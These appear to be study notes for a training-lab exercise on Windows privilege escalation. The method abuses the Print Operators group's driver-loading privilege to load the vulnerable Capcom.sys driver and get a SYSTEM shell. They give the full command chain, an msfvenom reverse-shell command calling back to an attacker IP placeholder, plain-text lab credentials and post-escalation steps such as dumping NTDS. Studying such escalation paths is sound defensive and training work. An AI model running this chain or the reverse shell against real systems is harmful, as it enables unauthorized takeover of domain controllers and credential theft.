# Section 14 — Print Operators

> **Lab: yes** — RDP to DC as Print Operators member. Load vulnerable Capcom.sys driver via SeLoadDriverPrivilege, then exploit it for SYSTEM shell.

**Core principle:** Print Operators group members have `SeLoadDriverPrivilege`, which lets them load kernel-mode drivers. By loading the intentionally vulnerable `Capcom.sys` driver (which lets any user execute shellcode as SYSTEM), they can escalate to `NT AUTHORITY\SYSTEM`. The privilege doesn't appear in an unelevated context — you must run from an elevated command prompt or bypass UAC.

---

## Why this works

```
1. Print Operators → grants SeLoadDriverPrivilege
2. SeLoadDriverPrivilege → can load arbitrary kernel drivers
3. Load Capcom.sys → known-vulnerable driver with built-in shellcode execution
4. Capcom.sys allows any user to run code as SYSTEM in kernel context
5. ExploitCapcom.exe → triggers the shellcode → SYSTEM shell or payload execution
```

---

## Prerequisites

| Requirement | Details |
|-------------|---------|
| Print Operators membership | Grants SeLoadDriverPrivilege |
| Elevated context | Privilege not visible from unelevated prompt — need admin cmd prompt (GUI) or UAC bypass |
| Capcom.sys | Vulnerable driver binary — must be on disk |
| EnableSeLoadDriverPrivilege.exe | Enables the privilege and loads the driver via NtLoadDriver |
| ExploitCapcom.exe | Triggers Capcom.sys to execute shellcode as SYSTEM |

> **Limitation:** Since Windows 10 version 1803, you can no longer reference registry keys under `HKEY_CURRENT_USER` for driver loading. This attack only works on older systems or DCs running Server 2016 and earlier.

---

## Attack overview

| Step | Tool | Purpose |
|------|------|---------|
| 1. Get elevated prompt | UAC bypass or GUI admin cmd | SeLoadDriverPrivilege only appears in elevated context |
| 2. Add driver registry key | `reg add` | Points HKCU registry to Capcom.sys path |
| 3. Enable privilege + load driver | `EnableSeLoadDriverPrivilege.exe` | Enables SeLoadDriverPrivilege and calls NtLoadDriver |
| 4. Exploit driver | `ExploitCapcom.exe` | Executes shellcode as SYSTEM via Capcom.sys |

---

## Step-by-step attack

### Step 1: Check privileges (unelevated)

```cmd
whoami /priv
```
> In an unelevated context, `SeLoadDriverPrivilege` won't appear at all. You'll only see basic privileges like `SeChangeNotifyPrivilege`. This doesn't mean you don't have it — it's just filtered by UAC.

### Step 2: Get an elevated command prompt

**With GUI (RDP):** Right-click Command Prompt → "Run as administrator" → enter Print Operators credentials when prompted.

**Without GUI:** Use a UAC bypass from the [UACMe](https://github.com/hfiref0x/UACME) repo.

### Step 3: Verify SeLoadDriverPrivilege is present (elevated)

```cmd
whoami /priv
```
> Now you should see `SeLoadDriverPrivilege` listed (state: Disabled). "Disabled" is fine — we'll enable it programmatically in the next steps.

### Step 4: Place Capcom.sys on disk

```cmd
copy C:\Tools\Capcom.sys C:\temp\Capcom.sys
```
> Ensure the driver binary is in a known, writable path. The registry key we create must point to this exact location.

### Step 5: Add registry key pointing to the driver

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\temp\Capcom.sys"
```
> Creates a registry entry under your user hive (`HKCU`) that tells Windows where to find the driver binary. The `\??\` prefix is NT Object Path syntax — required for the driver loader to resolve the path correctly.

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
> Sets the driver type to `1` (kernel driver). Without this key, `NtLoadDriver` won't recognize it as a valid driver entry.

### Step 6: Verify driver is NOT already loaded

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```
> Should return nothing — confirms Capcom.sys isn't loaded yet. If it's already loaded, someone beat you to it or you're re-running the attack.

### Step 7: Enable privilege and load the driver

```cmd
EnableSeLoadDriverPrivilege.exe
```
> This tool does three things: (1) enables `SeLoadDriverPrivilege` on the current token, (2) calls `NtLoadDriver` to load the Capcom driver from the registry path we set up, (3) prints the NTSTATUS result. Look for `NTSTATUS: 00000000` = success.

### Step 8: Verify driver is loaded

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```
> Should now show `Capcom.sys` with the path you specified. If empty, the load failed — check the registry key path and that Capcom.sys exists.

### Step 9: Exploit Capcom.sys for SYSTEM shell

**With GUI (RDP):**
```powershell
.\ExploitCapcom.exe
```
> Triggers Capcom.sys to execute token-stealing shellcode. A new command prompt window opens as `NT AUTHORITY\SYSTEM`. Run `whoami` to confirm.

**Without GUI (reverse shell):**

Before compiling, edit `ExploitCapcom.cpp` line 292 — change the command line from `cmd.exe` to your payload:
```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
> Replace with an msfvenom reverse shell binary. When ExploitCapcom runs, it executes your payload as SYSTEM instead of opening cmd.exe.

Generate the payload (attacker box):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o revshell.exe
```
> Standard reverse shell EXE. Upload to the path you specified in the modified ExploitCapcom.

### Step 10: Read the flag (from SYSTEM shell)

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

---

## Automated approach: EoPLoadDriver

Instead of manually adding registry keys and running EnableSeLoadDriverPrivilege, use `EoPLoadDriver.exe`:

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
```
> Does everything in one shot: enables SeLoadDriverPrivilege, creates the registry key, and calls NtLoadDriver. Then just run ExploitCapcom.exe as the next step.

---

## Cleanup

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```
> Removes the registry key pointing to the vulnerable driver. Confirm with `Y`. The driver stays loaded until reboot, but removing the key prevents it from loading again.

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-WINLPE-DC02)
**Creds:** `printsvc` / `HTB_@cademy_stdnt!`
**Goal:** Escalate to SYSTEM → read flag on Administrator's Desktop
**Access:** RDP
**Tools:** Pre-staged in `C:\Tools`
**Note:** ExploitCapcom.exe is inside `C:\Tools\ExploitCapcom\` subdirectory, not directly in `C:\Tools`.

### Attack chain (editable)

```
┌─────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                │
├─────────────────────────────────────────────────────────┤
│ TARGET_IP    = <TARGET_IP>                              │
│ ATTACKER_IP  = <ATTACKER_IP>  (tun0 IP)                │
│ USERNAME     = printsvc                                 │
│ PASSWORD     = HTB_@cademy_stdnt!                       │
│ TOOLS_DIR    = C:\Tools                                 │
│ DRIVER_PATH  = C:\Tools\Capcom.sys                     │
│ EXPLOIT_PATH = C:\Tools\ExploitCapcom\ExploitCapcom.exe │
└─────────────────────────────────────────────────────────┘

ATTACKER BOX
─────────────
1. RDP to target
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:printsvc /p:'HTB_@cademy_stdnt!'

TARGET BOX — GET ELEVATED PROMPT
─────────────────────────────────
2. Only PowerShell/ISE available in Start Menu (no cmd.exe shortcut)
   Right-click PowerShell ISE → Run as administrator
   Enter printsvc / HTB_@cademy_stdnt! at UAC prompt
   Or from unelevated PS: Start-Process cmd.exe -Verb RunAs

3. Verify SeLoadDriverPrivilege is present
   whoami /priv
   (Must see SeLoadDriverPrivilege — Disabled. If missing, you're NOT elevated)

TARGET BOX (ELEVATED prompt)
────────────────────────────
4. Add Capcom.sys registry keys
   reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
   reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

5. Enable privilege and load the driver
   C:\Tools\EnableSeLoadDriverPrivilege.exe
   (Look for NTSTATUS: 00000000 — if c0000061, you're NOT elevated)

6. Exploit for SYSTEM shell
   C:\Tools\ExploitCapcom\ExploitCapcom.exe
   (New SYSTEM cmd prompt window opens)

7. Read the flag (from SYSTEM shell)
   type C:\Users\Administrator\Desktop\flag.txt

CLEANUP
───────
8. Delete registry key
   reg delete HKCU\System\CurrentControlSet\Capcom
```

---

## Lab observations & attack chain

```
Print Operators membership (printsvc)
│
├── SeLoadDriverPrivilege (only in elevated context)
│   └── Requires UAC bypass or elevated cmd prompt
│
├── Load vulnerable Capcom.sys driver
│   ├── Create registry key: HKCU\System\CurrentControlSet\CAPCOM
│   │   ├── ImagePath → \??\C:\Tools\Capcom.sys
│   │   └── Type → 1 (kernel driver)
│   ├── EnableSeLoadDriverPrivilege.exe → enables priv + loads driver
│   └── Verify: DriverView shows Capcom.sys loaded
│
├── Exploit Capcom.sys
│   ├── WITH GUI:  ExploitCapcom.exe → SYSTEM cmd prompt
│   └── NO GUI:    Modify ExploitCapcom.cpp → point to revshell.exe
│       └── msfvenom payload executes as SYSTEM
│
├── Post-escalation (SYSTEM)
│   ├── Read flag
│   ├── Dump SAM/NTDS
│   ├── Add to Domain Admins
│   └── Full machine/domain access
│
└── Cleanup
    └── reg delete HKCU\...\Capcom
```

---

## Key takeaways

- **Print Operators = SeLoadDriverPrivilege = kernel driver loading = SYSTEM.** One of the most dangerous built-in groups.
- **The privilege is hidden by UAC.** Won't appear in `whoami /priv` from a normal prompt — must run elevated or bypass UAC first.
- **Capcom.sys is the classic exploit driver.** It intentionally allows usermode shellcode execution in kernel context. Load it, exploit it, get SYSTEM.
- **EoPLoadDriver automates steps 4-5.** Single command instead of manual registry + enable.
- **Patched on Windows 10 1803+.** HKCU-based driver registry references no longer work. Still works on Server 2016 DCs and older systems.
- **Without GUI, modify ExploitCapcom.cpp** to point to a reverse shell binary instead of `cmd.exe`.
- **Use `sc.exe` not `sc` in PowerShell** if interacting with services during this attack.
